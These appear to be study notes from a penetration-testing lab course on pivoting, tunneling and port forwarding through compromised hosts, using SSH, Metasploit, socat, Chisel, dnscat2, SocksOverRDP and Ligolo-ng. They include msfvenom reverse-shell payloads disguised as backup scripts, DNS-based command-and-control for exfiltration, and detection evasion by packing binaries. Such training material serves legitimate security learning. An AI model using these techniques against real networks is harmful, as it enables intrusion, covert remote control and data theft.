--------------------

### Pivoting,Tunneling and Port Forwarding

-------------------

- Pivoting means moving from one part of a network to another part through a compromised host to find more compromised segments of a network.
- Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. Tunneling, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it.
- We have a key we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.
- Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment.Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts.
- Tunneling involves  using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. A good example involves masking our Command and Control traffic with the aid of `HTTP` and `HTTPS` traffic.If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

--------------------

### Networking behind Pivoting

---------------------

- Ip addressing and NIC-: Every computer that is communicating on a network needs an IP address. If it doesn't have one, it is not on a network. The IP address is assigned in software and usually obtained automatically from a DHCP server. It is also common to see computers with statically assigned IP addresses. Static IP assignment is common with:
  - Servers
  - Routers
  - Switch Virtual Interfaces
  - Printers
  - And any devices that are providing critical services to the network

- Whether assigned dynamically or statically, the IP address is assigned to a Network Interface Controller (NIC).
- Commonly, the NIC is referred to as a Network Interface Card or Network Adapter. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like `ifconfig` (in macOS and Linux) and `ipconfig` (in Windows).
- Every IPv4 address will have a corresponding subnet mask. If an IP address is like a phone number, the subnet mask is like the area code. Remember that the subnet mask defines the network & host portion of an IP address. When network traffic is destined for an IP address located in a different network, the computer will send the traffic to its assigned default gateway. The default gateway is usually the IP address assigned to a NIC on an appliance acting as the router for a given LAN. In the context of pivoting, we need to be mindful of what networks a host we land on can reach, so documenting as much IP addressing information as possible on an engagement can prove helpful.
- Check Routing tables with `netstat -r` and `ip route` on windows.

--------------------

### Protocols, ports & services

--------------------

- Protocols are the rules that govern network communications. Many protocols and services have corresponding ports that act as identifiers. Logical ports aren't physical things we can touch or plug anything into. They are in software assigned to applications. When we see an IP address, we know it identifies a computer that may be reachable over a network. When we see an open port bound to that IP address, we know that it identifies an application we may be able to connect to. Connecting to specific ports that a device is listening on can often allow us to use ports & protocols that are permitted in the firewall to gain a foothold on the network.
- Let's take, for example, a web server using HTTP (often listening on port 80). The administrators should not block traffic coming inbound on port 80. This would prevent anyone from visiting the website they are hosting. This is often a way into the network environment, through the same port that legitimate traffic is passing. We must not overlook the fact that a source port is also generated to keep track of established connections on the client-side of a connection. We need to remain mindful of what ports we are using to ensure that when we execute our payloads, they connect back to the intended listeners we set up. We will get creative with the use of ports throughout this module.

------------------- 

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

-------------------

- Port forawrding involves redirecting a communication request from one port to another port.Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.
- Example-:

![image](https://github.com/user-attachments/assets/8b0a9a0c-1cd6-4ea8-b6c9-4df38673b238)

- Scanning the pivot target-:

![image](https://github.com/user-attachments/assets/214883ca-e00e-4eaf-8277-e10027245e60)

- The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306.
- We'll use ssh to portforward the mysql service.Add `-N` to make it non verbose,Syntax-:

```bash
ssh -N -L [attacker's port]:localhost:[internal service port] ubuntu@10.129.202.64
```
-  Forwarding multiple ports-:

```bash
ssh -N -L [attacker's port]:localhost:[internal service port] -L [attacker's port]:localhost:[internal service port] ubuntu@10.129.202.64
```

![image](https://github.com/user-attachments/assets/862c42e8-c15d-4ebe-aff3-5d0124f91075)

-----------------

### Setting up for pivot-:

-----------------

- Now, if you type ifconfig on the Ubuntu host, you will find that this server has multiple NICs: 
    - One connected to our attack host (ens192)
    - One communicating to other hosts within a different network (ens224)
    - The loopback interface (lo).

- Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

- This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

- This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.


----------------

### Dynamic port fowarding with ssh and proxychains

----------------

- In dynamic portforwarding,we'll set ssh to receive packets.The SSH server responds with an acknowledgment, and the SSH client then starts listening on localhost:9050.
- Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH.
- SSH syntax-:

```bash
ssh -fND 9050 ubuntu@10.129.202.64
```
- After setting up dynamic port forwarding, a tool like proxychains is required which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together.Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.
- To inform proxychains to use port 9050,you have to make a configuration.Add to `/etc/proxychains.conf`-:

```conf
socks4 127.0.0.1 9050
```

- Confirm it-:

![image](https://github.com/user-attachments/assets/5f6b7c23-4004-43cd-b7b3-aeb255e9f81d)

- Using proxychains with nmap-:

```bash
proxychains nmap -sn 172.16.5.1-200
```

![image](https://github.com/user-attachments/assets/baa1e850-0471-4bf4-9eba-cee330cfd139)

- This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.Enumerating windows host-:

```bash
proxychains nmap -v -Pn -sT 172.16.5.19 
```
or

```bash
proxychains nmap -sVT 172.16.5.19 -Pn
```

-----------------

### Using proxychains with Metasploit

----------------

- Syntax-:

```
proxychains msfconsole
```

![image](https://github.com/user-attachments/assets/05efc465-adbf-48e9-824d-6a99de469517)

- Use msfconsole module `rdp_scanner` to check if rdp is running on port `3389`.

```msfconsole
search "rdp_scanner"
```
- set host with `set rhosts <ip>`
- Run-:

![image](https://github.com/user-attachments/assets/24eda74b-5302-45dd-8cb8-a568f90654cb)

- Connecting to rdp with xfreerdp-:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

- Running it-:

![image](https://github.com/user-attachments/assets/e3601d9b-5f37-4421-b0d8-f2327c362cdd)

---------------------

### Remote/Reverse Portforwarding with SSH

--------------------

- We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host Windows A. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

- What if we want to gain a reverse shell on the internal victim server.The windows host can only communicate to hosts within `172.16.5.0/23` network.If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).
- In this case,we might want to find a pivot host,which is a common connection point between our attack host and the Windows server.In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

- Creating a msfvenom payload-:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
![image](https://github.com/user-attachments/assets/09caec8d-8f58-4ae9-96d0-31eb17c30d6d)

- Configure multi handler

```msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```
![image](https://github.com/user-attachments/assets/988bcee2-ae20-43b0-92f1-a5e25e299ebe)

- Transfer payload to pivot host with scp-:

```ssh
scp filename ubuntu@host:~/
```

![image](https://github.com/user-attachments/assets/ef9a0e0d-a6d3-4a82-8a21-baf3e600c92f)

- Start a python web server on the Internal Pivost Host-:

- Downloading the file on the victim windows server-:

![image](https://github.com/user-attachments/assets/ee3b400c-f5c8-4a85-8d4b-02ff633e18ad)

- Dynamic port forwarding Syntax-:

```bash
ssh -R <InternalIPofPivotHost>:[listening port on internal host]:0.0.0.0:[target-Attacker'sport] ubuntu@<ipAddressofTarget> -vN
```
![image](https://github.com/user-attachments/assets/b6c2180d-1fa3-4ac9-80f9-ca4631d7d7f9)

- Execute payload-:

![image](https://github.com/user-attachments/assets/b338454f-6908-4f8f-bde0-93d577e0b535)

- Received over meterpreter-:

![image](https://github.com/user-attachments/assets/776f8f42-c9e1-42bd-8d09-89528ce9b300)

------------------

### Meterprreter tunnelling and port forwarding

------------------

- Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.
- Generate a linux reverse shell binary-:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] -f elf -o backupjob LPORT=8080
```
- Set a bash reverse shell on msfconsole-:

```bash
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

![image](https://github.com/user-attachments/assets/b6d3ec1d-9ca2-461a-92db-8b55387603ee)

- Shell

![image](https://github.com/user-attachments/assets/9b50907e-6f9f-4082-9205-bd1ac9137aa8)

- Set the shell to background with `background`

----------------

### Ping sweep on Windows Host

----------------

- We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.

```msfconsole
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
![image](https://github.com/user-attachments/assets/83dac346-649e-4515-b3f9-7e6eab0a230a)

- Ping sweep with Linux-:

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

- CMD-:
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

-  Powershell-:

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

- There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
- Configuring the SOCKS4 proxy-:

```msfconsole
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```
![image](https://github.com/user-attachments/assets/b09a0765-cc4f-4c0e-a958-b04ee668ab6f)

- Check if it is running with `jobs`-:

![image](https://github.com/user-attachments/assets/859bbf9b-9477-41b4-9a37-d2cc9d3f86b2)

- Configure proxychains later[/etc/proxychains.conf]-:

```conf
socks4 	127.0.0.1 9050
```
- Use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.-:

```msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

![image](https://github.com/user-attachments/assets/a21f4247-7398-4bd0-99dc-19c6b8da410b)

- You can also autoroute by using the command below.

```
run autoroute -s 172.16.5.0/23
```

![image](https://github.com/user-attachments/assets/44d572ae-f22a-48e1-83dc-f1ce963349eb)

- List active routes with

```msfconsole
run autoroute -p
```

- Testing the functionality-:

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
![image](https://github.com/user-attachments/assets/40593f05-9cff-4fa2-974d-22f4daa9b596)

---------------

### Port forwarding with metasploit

---------------

- Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
- Create a local tcp portforward with portfwd-:

```bash
portfwd add -l <attacker's port> -p <remote port> -r <remote host>
```

![image](https://github.com/user-attachments/assets/d608b6f8-de7d-4f20-87d2-65758018e8a2)

- Connect with xfreerdp-:

![image](https://github.com/user-attachments/assets/5175d90a-fee6-4398-863d-f75240219a02)

-----------------

### Meterpreter Reverse Port Forwarding

-----------------

- Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.
- We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
- Syntax-:

```bash
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
-  Generate a windows/reverse_tcp  payload-:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
- Set a windows msf reverse shell-:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 8081
run
```

- Activate the shell on the rdp session

-----------------

### Socat redirection with a reverse shell

----------------

- Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.
- Set on compromised pivot host-:

```
socat TCP4-LISTEN:[listening port on compromised's host],fork TCP4:[attacker'sip]:[attacker'sport]
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

![image](https://github.com/user-attachments/assets/62a7d0b6-a8fd-4870-a106-19b59e54b40a)

- Socat will listen on port 8080 and redirect data to our attacker's port.Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
- Create a reverse https shell-:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

- Setup a reverse https exploit/handle

![image](https://github.com/user-attachments/assets/e2181cef-7b79-4c61-adb7-efe2149aa41a)

-  Run exploit and shell-:

![image](https://github.com/user-attachments/assets/a25fa55e-1141-4189-8fa3-d56e2af86097)

----------------

### Socat redirection with  bind shell 

----------------

- Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
- Creating a msfvenom bindshell-:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
![image](https://github.com/user-attachments/assets/65af20ff-72d9-499a-80a0-fe87599fdbf7)

- Start a socat bind listener-:

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

- Setting up  bind multi handler-:

```msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST  10.129.210.63
set LPORT 8080
run
```
![image](https://github.com/user-attachments/assets/aefa8a54-a210-410a-8a91-8d8f42ea10ff)

-  Shell-:

![image](https://github.com/user-attachments/assets/d44e578b-d474-4a23-abd3-749a393e89d5)

--------------

### Portforwarding with socat

--------------

-  Syntax-:

```bash
socat TCP4-LISTEN:[listening port],fork TCP4:[internal-ip]:[internal-port]
```
![image](https://github.com/user-attachments/assets/0cb6ceae-0a09-42c4-83aa-ffd0e4084573)


---------------

### SSH for windows:- plink.exe

---------------

- Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
- Incase a window host is our attack host.We can use ssh for dynamic port forwarding-:

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

---------------

### Pivoting with sshuttle

---------------

- Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.
- Installing `sshuttle`-:

```bash
sudo apt-get install sshuttle
```

- To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
![image](https://github.com/user-attachments/assets/b83150d7-ae82-41b4-b9c5-ce99598826d5)

- Routing is done through ip-tables.
- Nmap-:

```
nmap -v -sV -p3389 172.16.5.19 -A -Pn
```
![image](https://github.com/user-attachments/assets/d0a9de1a-b560-415f-81c7-042c47893eaa)

- Rdp access-:

![image](https://github.com/user-attachments/assets/bbdfad7b-7309-48d4-8a2a-64fa1eab1cdc)


----------------

### Using Netsh to port forward on windows

-----------------

- Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
 - Finding routes
 - Viewing the firewall configuration
 - Adding proxies
 - Creating port forwarding rules
- Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (10.129.15.150, 172.16.5.25). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.


- We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```

- Confirm port-forwarding with-:

```cmd
netsh.exe interface portproxy show v4tov4
```

-----------------

### Portforwarding with dnscat

------------------

- Installing dnscat2-:

```cmd
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

![image](https://github.com/user-attachments/assets/a19e95d8-4402-4311-8eff-818a54323133)

- Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
- Setting up the server-:

```bash
sudo ruby dnscat2.rb --dns host=[your ip],port=53,domain=[domain name] --no-cache
```

- Cloning dnscat2-powershell to the Attack Host

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
- Import dnscat ps1 script-:

```
Import-Module .\dnscat2.ps1
```

![image](https://github.com/user-attachments/assets/b990b509-3714-486e-980f-aa80717ae3a3)

- Establish tunneling with-:

```cmd
Start-Dnscat2 -DNSserver [dns'ip] -Domain [domain] -PreSharedSecret [secret] -Exec cmd 
```

![image](https://github.com/user-attachments/assets/b3cb5adc-3757-4035-862e-ac0be35f5425)

- Use `?` to list commands-:

![image](https://github.com/user-attachments/assets/071ff9bb-ddbb-481f-8597-639ece0b9a53)

- Interact with the established session with-:

```dnscat
window -i 1
```
![image](https://github.com/user-attachments/assets/17e2a137-db46-43ec-b5bb-080bd4a792f3)

- Shell-:

![image](https://github.com/user-attachments/assets/32112045-c2a4-4a99-8545-a7db83c5a823)


-----------------

### Chisel

-----------------

- Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 network (internal network). We have the Domain Controller with the address 172.16.5.19. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
- Setting up Chisel-:

```bash
git clone https://github.com/jpillora/chisel.git
```
- Shrinking chisel size to prevent detection based on ippsec's idea, use [upx](https://github.com/upx/upx/releases/)

```bash
upx brute chisel
```
![image](https://github.com/user-attachments/assets/615624d1-eac3-4e35-b211-dac4746a8dec)

- Running a server on the pivot host-:

```bash
./chisel server -v -p 1234 --socks5
```

- The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
- Then,We start a client server on our attack host and connect it to the pivot server.

```bash
./chisel client -v 10.129.202.64:1234 [port]:socks
```
![image](https://github.com/user-attachments/assets/8fd7d777-36a7-4334-b252-f71b0d34f591)

- As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.
- Add to proxychains.conf

```conf
socks5 127.0.0.1 1080
```
![image](https://github.com/user-attachments/assets/08f29206-a665-435c-b4c3-3e57b045c44d)

- Testing it with proxychains and `nmap`-:

![image](https://github.com/user-attachments/assets/dcb3b921-416f-4abb-a56c-462986de9a0b)

-----------------

### Chisel Reverse Pivot

-----------------

- In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.This option is used we cannot connect to the pivot host due to firewall restrictions.
- When CHisel is in `--reverse` mode, the option `R:socks` is used to indicate reverse on our attack host.Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
- Starting the server requires `--reverse`-:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```
![image](https://github.com/user-attachments/assets/4816980e-cdec-471f-895e-7289185f0311)

- Client[Pivot host],don't forget to specify socks5 port with `R:[port]:socks`-:

```bash
./chisel client -v 10.10.15.4:1234 R:1080:socks
```

![image](https://github.com/user-attachments/assets/d7bbc5b0-bf9f-42ec-92c4-fb12c41811c7)

- Set proxychains

![image](https://github.com/user-attachments/assets/1776dbed-91d9-4b60-ad67-d87623516821)

- Worked-:

![image](https://github.com/user-attachments/assets/cdd4bf20-c0d2-4547-84da-07908ed05773)

-----------------

### Double Pivoting with SocksoverRDP

------------------

- There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server.
- Link to the binaries:[Proxifier](https://www.proxifier.com/download/#win-tab) and [SocksoverRDPx64binaries](https://github.com/nccgroup/SocksOverRDP/releases).For `Proxifier`,use `ProxifierPE.zip`
- Unzipping with powershell-:

```powershell
Expand-Archive -Path "C:\path\to\your\file.zip" -DestinationPath "C:\path\to\destination"
```
![image](https://github.com/user-attachments/assets/9dcb737d-4648-44b4-b2f2-d0549f22e1a7)

- Loading SocksOverRDP.dll using regsvr32.exe-:

```powershell
regsvr32.exe SocksOverRDP-Plugin.dll
```
- Note that the shell has to be an admin one unless you'll get an error-:

![image](https://github.com/user-attachments/assets/4ec58a61-0c4d-4790-ac10-34c6d12890fc)

-  Use `mstsc.exe` on non-admin command prompt,add host address first-:

![image](https://github.com/user-attachments/assets/3213d377-0303-42f4-9cdc-1d58a23a9b3b)

- `Show options` to set username and password
- Connected-:

![image](https://github.com/user-attachments/assets/4cb78010-bd1b-4ab9-8334-d4f610897283)

- Transfer the `socksoverdp.exe` file to the host.
  - Base64 encode it with this [site](https://www.browserling.com/tools/file-to-base64)
  - Save it in a file
  - Use `certutil.exe` to decode it
    ```cmd
    certutil -decode upload.txt upload.zip
    ```
    ![image](https://github.com/user-attachments/assets/abe331c8-bbfc-4cbc-92d4-0779cf22950a)

- Start socksoverdp exe with admin rights{admin command prompt]-:

![image](https://github.com/user-attachments/assets/5904ab5a-2a18-49c7-81e2-22e99c8e9f3d)

- Discover if it is working with `netstat -aon | findstr "1080"`

![image](https://github.com/user-attachments/assets/a17de9b8-b053-42ea-8560-237a80cfac41)

- Configuring `Proxifier`-:

![image](https://github.com/user-attachments/assets/20f53a08-ca13-4fc2-b1ae-6d4f7ec751ea)

- With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

![image](https://github.com/user-attachments/assets/21bdb337-e503-4870-a111-926b58614bd2)

--------------------

### Ligolo-ng

--------------------

- Ligolo-Ng is a lightweight and efficient tool designed to enable penetration testers to establish tunnels through reverse TCP/TLS connections, employing a tun interface. Noteworthy features include its GO-coded nature, VPN-like behavior, customizable proxy, and agents in GO.
- Installing ligolo-ng, check [here](https://github.com/nicocha30/ligolo-ng/releases),download an agent for windows and another proxy or server for linux-:

![image](https://github.com/user-attachments/assets/8a713860-6403-445b-8319-e0527032b333)

- Setting up ligolo-ng by setting its interface-:

```bash
ip tuntap add user root mode tun ligolo
ip link set ligolo up
```

![image](https://github.com/user-attachments/assets/ace3845c-a46b-4874-901c-00dcef6393a4)

- This proxy file facilitates the establishment of a connection through Ligolo, enabling us to execute subsequent pivoting actions.
- Start the proxy with `./proxy -selfcert`

![image](https://github.com/user-attachments/assets/587f81fd-c1f4-421f-a5ec-b52255bb9507)

- Transfer `agent.exe` to the target with iwr
- To start the agent,use-:
```cmd
./agent.exe -connect [ip]:11601 -ignore-cert
```

- Upon executing the specified command, a Ligolo session is initiated. Subsequently, employ the ‘session’ command, opting for ‘1’ to access the active session.

![image](https://github.com/user-attachments/assets/f3027a9a-dea4-49f6-9c61-85a30613137a)

- `Ifconfig` reveals the existence of an internal network on `172.16.5.150/16`

![image](https://github.com/user-attachments/assets/e429fca8-4207-4864-bdb0-600813f0d72d)

- Single pivoting with `ligolo-ng`,To start the idea of pivoting to internal network, use the commands below to add the ip route-:

```bash
sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route list
```
![image](https://github.com/user-attachments/assets/a9a7cd7d-fdd1-4cac-82d3-823e25396632)

- Use `start` to create a tunnel on ligolo-ng, always start proxy with root-:

![image](https://github.com/user-attachments/assets/8cbd52ac-5e3b-45ba-8d49-925291b0244e)

- We can ping a host-:

![image](https://github.com/user-attachments/assets/9fdcbc04-efe5-4c95-9d43-6d4165cbdcd9)

![image](https://github.com/user-attachments/assets/d7b3fc1c-b057-4e0b-80be-56219d6d715d)

- Double pivoting-:It involves gaining to a third network from the first one using the second one as intermidiary-:

- Login with impacket, install impacket with-:

```bash
git clone https://github.com/SecureAuthCorp/impacket.git impacket
cd impacket
sudo apt install python3-impacket
sudo python3 ./setup.py install
```

- Creating binary for any impacket script-:

```
sudo cp /usr/bin/impacket-secretsdump /usr/bin/impacket-psexec
sudo chmod +x /usr/bin/impacket-psexec
sudo chown user:user /usr/bin/impacket-psexec
```

- Using impacket-exec-:

